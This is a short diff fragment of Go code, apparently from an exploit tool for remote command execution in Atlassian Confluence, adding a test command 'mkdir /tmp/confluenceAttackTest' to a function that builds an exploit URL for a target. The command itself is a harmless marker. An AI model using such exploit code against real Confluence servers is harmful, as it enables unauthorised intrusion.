@@ -11,6 +11,7 @@ import (
 func ConfluenceCmdExecute(url string, endpoint string) string {
 
   var cmd string
+	cmd = "mkdir /tmp/confluenceAttackTest"
 
   exploitUrl := url + endpoint
   /* This is used in the python script
